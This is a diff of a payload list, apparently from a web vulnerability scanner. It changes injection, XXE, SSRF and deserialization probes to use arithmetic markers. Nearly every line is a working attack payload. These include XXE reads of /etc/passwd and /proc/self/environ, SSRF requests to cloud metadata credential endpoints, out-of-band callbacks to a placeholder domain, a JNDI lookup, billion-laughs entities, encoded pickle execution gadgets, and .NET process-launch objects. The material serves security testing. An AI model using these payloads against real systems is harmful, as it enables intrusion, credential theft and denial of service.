@@ -80,7 +80,6 @@ new java.net.URL('http://{domain}/javaeval').openStream()
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{domain}/xxe">]><foo>&xxe;</foo>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://{domain}/evil.dtd">%dtd;%payload;]><foo>&exfil;</foo>
 <xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "1337">]><foo>&a;</foo>
 ##POLYGLOT - SSRF##
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 http://metadata.google.internal/computeMetadata/v1/
@@ -576,15 +575,6 @@ ${"java.net.URL"?new("http://{domain}/ssti").openStream()}
 ##Smarty (PHP) - OOB##
 {fetch file="http://{domain}/smarty"}
 {fetch file="http://{domain}/smarty" assign="x"}
-##Blade (PHP/Laravel) - Math##
-{!!7*191!!}
-##Blade (PHP/Laravel) - Error##
-{{$undefined->method()}}
-##Blade (PHP/Laravel) - Timing##
-@php sleep(5); @endphp
-##Blade (PHP/Laravel) - OOB##
-@php file_get_contents('http://{domain}/blade') @endphp
-@php fopen('http://{domain}/blade','r') @endphp
 ##ERB (Ruby) - Error##
 <%=invalid%>
 <%=raise 'ssti_error'%>
@@ -609,7 +599,7 @@ ${"java.net.URL"?new("http://{domain}/ssti").openStream()}
 {{invalid | no_such_filter}}
 ##Thymeleaf (Java) - Math##
 [[${7*191}]]
-[[${T(java.lang.Math).abs(-1337)}]]
+[[${T(java.lang.Math).multiplyExact(7,191)}]]
 *{7*191}
 ##Thymeleaf (Java) - Error##
 [[${T(invalid).method()}]]
@@ -637,8 +627,8 @@ ${"java.net.URL"?new("http://{domain}/ssti").openStream()}
 @{new System.Net.WebClient().DownloadString("http://{domain}/razor");}
 @{new System.Net.Http.HttpClient().GetStringAsync("http://{domain}/razor").Result;}
 ##Go text/template - Math##
-{{printf "%d" 1337}}
-{{html 1337}}
+{{multiply 7 191}}
+{{add 1336 1}}
 ##Go text/template - Error##
 {{.Invalid}}
 {{template "nonexistent"}}
@@ -842,8 +832,7 @@ require('socket').sleep(5)
 require("socket").connect("{domain}", 80)
 require("socket.http").request("http://{domain}/lua")
 ##PHP Code Injection##
-assert(system('echo 1337'))
-preg_replace('/.*/e','system("echo 1337")','')
+system('expr 7 \\* 191')
 create_function('','return 7*191;')()
 assert(sleep(5)||1)
 assert(file_get_contents('http://{domain}/php'))
@@ -862,7 +851,7 @@ Thread.sleep(5000)
 new GroovyShell().evaluate('Thread.sleep(5000)')
 ##Groovy Code Injection - OOB##
 new URL('http://{domain}/groovy').text
-['curl','http://{domain}/groovy'].execute()
+new java.net.URL('http://{domain}/groovy2').openStream()
 "http://{domain}/groovy".toURL().text
 ##Groovy Code Injection - Error##
 throw new Exception('1337')
@@ -924,18 +913,16 @@ ${alert(1337)}
 <svg><script>alert(1337)</script></svg>
 
 ##XXE - Error-Based##
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "1337">]><root>&xxe;</root>
-<foo>1337</foo>
-<![CDATA[1337]]>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM>]><root/>
 ##XXE - File Read##
 <!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>
 ##XXE - OOB##
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{domain}/xxe.dtd">%xxe;]><root>1337</root>
 <hjk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://{domain}/xxe" parse="text"/></hjk>
 ##XXE - Billion Laughs (Timing/DoS)##
-<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "1337"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>
+<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "ABCDEFGHIJ"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">]><root>&lol6;</root>
 ##XXE - Error (recursive entity)##
-<!DOCTYPE foo [<!ENTITY a "&#x26;b;"><!ENTITY b "1337">]><foo>&a;</foo>
+<!DOCTYPE foo [<!ENTITY a "&#x26;b;"><!ENTITY b "&#x26;a;">]><foo>&a;</foo>
 ##SSRF - Error-Based##
 http://[invalid
 http://
@@ -1410,8 +1397,8 @@ admin'//
 
 ##Python Pickle P0 - Math (eval 7*191)##
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnNyoxOTEnCnRSLg==
-##Python Pickle P0 - Timing (sleep 5)##
-Y29zCnN5c3RlbQooUydzbGVlcCA1Jwp0Ui4=
+##Python Pickle P0 - Timing (time.sleep 5)##
+Y3RpbWUKc2xlZXAKKEk1CnRSLg==
 ##Python Pickle P0 - OOB urllib##
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97ZG9tYWlufS9waWNrbGUiKScKdFIu
 ##Python Pickle P0 - OOB DNS##
@@ -1420,28 +1407,28 @@ Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygic29ja2V0IikuZ2V0YWRkcmluZm8oIntkb21h
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnMS8wJwp0Ui4=
 ##Python Pickle P0 - Error (bad import)##
 Y19fYnVpbHRpbl9fCl9faW1wb3J0X18KKFMnaW52YWxpZF9tb2R1bGVfMTMzNycKdFIu
-##Python Pickle P0 - Math (subprocess echo 1337)##
-Y3N1YnByb2Nlc3MKY2hlY2tfb3V0cHV0CihTJ2VjaG8gMTMzNycKSTAxCnRSLg==
+##Python Pickle P0 - Math (eval str(7*191))##
+Y19fYnVpbHRpbl9fCmV2YWwKKFMnc3RyKDcqMTkxKScKdFIu
 ##Python Pickle P2 - Math (eval 7*191)##
 gAJjX19idWlsdGluX18KZXZhbApxAFgFAAAANyoxOTFxAYVxAlJxAy4=
-##Python Pickle P2 - Timing (sleep 5)##
-gAJjcG9zaXgKc3lzdGVtCnEAWAcAAABzbGVlcCA1cQGFcQJScQMu
+##Python Pickle P2 - Timing (time.sleep 5)##
+gAJjdGltZQpzbGVlcApxAEsFhXEBUnECLg==
 ##Python Pickle P2 - OOB urllib##
 gAJjX19idWlsdGluX18KZXZhbApxAFhHAAAAX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97ZG9tYWlufS9waWNrbGUyIilxAYVxAlJxAy4=
 ##Python Pickle P2 - Error (1/0)##
 gAJjX19idWlsdGluX18KZXZhbApxAFgDAAAAMS8wcQGFcQJScQMu
 ##Python Pickle P4 - Math (eval 7*191)##
 gASVIQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwFNyoxOTGUhZRSlC4=
-##Python Pickle P4 - Timing (sleep 5)##
-gASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCA1lIWUUpQu
+##Python Pickle P4 - Timing (time.sleep 5)##
+gASVGAAAAAAAAACMBHRpbWWUjAVzbGVlcJSTlEsFhZRSlC4=
 ##Python Pickle P4 - OOB urllib##
 gASVYwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxHX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97ZG9tYWlufS9waWNrbGU0IimUhZRSlC4=
 ##Python YAML - Math (eval 7*191)##
 !!python/object/apply:builtins.eval ["7*191"]
-##Python YAML - Math (subprocess echo 1337)##
-!!python/object/apply:subprocess.check_output [["echo","1337"]]
+##Python YAML - Math (eval str(7*191))##
+!!python/object/apply:builtins.eval ["str(7*191)"]
 ##Python YAML - Timing (sleep 5)##
-!!python/object/apply:os.system ["sleep 5"]
+!!python/object/apply:time.sleep [5]
 ##Python YAML - OOB urllib##
 !!python/object/apply:builtins.exec ["import urllib.request;urllib.request.urlopen('http://{domain}/yaml')"]
 ##Python YAML - OOB DNS##
@@ -1454,8 +1441,8 @@ gASVYwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxHX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3Qi
 !!python/object/apply:builtins.exec ["import urllib.request;urllib.request.urlopen('http://{domain}/yaml2')"]
 ##Python jsonpickle - Math (eval 7*191)##
 {"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["7*191"]}]}
-##Python jsonpickle - Math (subprocess echo 1337)##
-{"py/reduce":[{"py/function":"subprocess.check_output"},{"py/tuple":[["echo","1337"]]}]}
+##Python jsonpickle - Math (eval str(7*191))##
+{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["str(7*191)"]}]}
 ##Python jsonpickle - Timing (sleep 5)##
 {"py/reduce":[{"py/function":"time.sleep"},{"py/tuple":[5]}]}
 ##Python jsonpickle - Error (1/0)##
@@ -1480,8 +1467,8 @@ O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"\0*\0events";O:28:"Illum
 O:44:"Symfony\Component\Cache\Adapter\ProxyAdapter":2:{s:54:"\0Symfony\Component\Cache\Adapter\ProxyAdapter\0pool";O:44:"Symfony\Component\Cache\Adapter\ArrayAdapter":3:{s:54:"\0Symfony\Component\Cache\Adapter\ArrayAdapter\0values";a:0:{}s:60:"\0Symfony\Component\Cache\Adapter\ArrayAdapter\0expiration";a:0:{}s:21:"\0*\0createCacheItem";a:2:{i:0;O:15:"Faker\Generator":1:{s:13:"\0*\0formatters";a:1:{s:11:"fetchObject";s:6:"system";}}i:1;s:11:"fetchObject";}}s:58:"\0Symfony\Component\Cache\Adapter\ProxyAdapter\0setInner";s:9:"echo 1337";}
 ##Node node-serialize - Math (return 7*191)##
 {"rce":"_$$ND_FUNC$$_function(){return 7*191}()"}
-##Node node-serialize - Timing (sleep 5)##
-{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('sleep 5')}()"}
+##Node node-serialize - Timing (blocking 5s)##
+{"rce":"_$$ND_FUNC$$_function(){var d=Date.now()+5000;while(Date.now()<d){}}()"}
 ##Node node-serialize - OOB http.get##
 {"rce":"_$$ND_FUNC$$_function(){require('http').get('http://{domain}/nodeser')}()"}
 ##Node node-serialize - Math (eval 7*191)##
@@ -1493,7 +1480,7 @@ O:44:"Symfony\Component\Cache\Adapter\ProxyAdapter":2:{s:54:"\0Symfony\Component
 ##Node js-yaml - Error (bad regexp)##
 !!js/regexp /[invalid/
 ##Node funcster - Error (invalid code)##
-{"__js":"throw new Error(1337)"}
+{"fn":{"__js_function":"function(){return 7*191}"}}
 ##Node cryo - Error (proto pollution)##
 {"__proto__":{"__cryo__":{"reduce":"_$$ND_FUNC$$_function(){throw new Error(1337)}()"}}}
 ##Ruby YAML - Error (invalid class)##
@@ -1580,8 +1567,8 @@ ${jndi:ldap://{domain}/${sys:user.dir}}
 !!com.nonexistent.FakeClass1337 {}
 ##SnakeYAML - Error (C3P0)##
 !!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource {userOverridesAsString: "HexAsciiSerializedMap:aced...;", jndiName: "ldap://{domain}/a"}
-##XMLDecoder - Math (echo 1337)##
-<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>echo 1337</string></void></array><void method="start"/></object></java>
+##XMLDecoder - Math (expr 7*191)##
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>expr 7 \* 191</string></void></array><void method="start"/></object></java>
 ##XMLDecoder - Timing (sleep 5)##
 <java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.Thread" method="sleep"><long>5000</long></object></java>
 ##XMLDecoder - OOB URL.openStream##
@@ -1598,8 +1585,8 @@ rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9s
 C_hessianRldap://{domain}/a
 ##.NET Json.NET - OOB (nslookup)##
 {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"nslookup","Arguments":"{domain}"}}}
-##.NET Json.NET - Math (echo 1337)##
-{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c echo 1337"}}}
+##.NET Json.NET - Math (set /a 7*191)##
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c set /a 7*191"}}}
 ##.NET Json.NET - Timing (timeout 5)##
 {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c timeout 5"}}}
 ##.NET Json.NET - OOB (AssemblyInstaller UNC)##
@@ -1617,7 +1604,7 @@ __VIEWSTATE=/wEPDwUKLTEyMzQ1Njc4OQ==
 ##.NET ViewState - Error (generator)##
 __VIEWSTATEGENERATOR=CA0B0334
 ##.NET JavaScriptSerializer - Error (ObjectDataProvider)##
-{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"__type":"System.Diagnostics.Process, System","StartInfo":{"__type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c echo 1337"}}}
+{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"__type":"System.Diagnostics.Process, System","StartInfo":{"__type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c set /a 7*191"}}}
 ##.NET LosFormatter - Error (truncated)##
 /wEAAQAAAP////8BAAAAAAAAAA==
 ##.NET ObjectStateFormatter - Error (probe)##
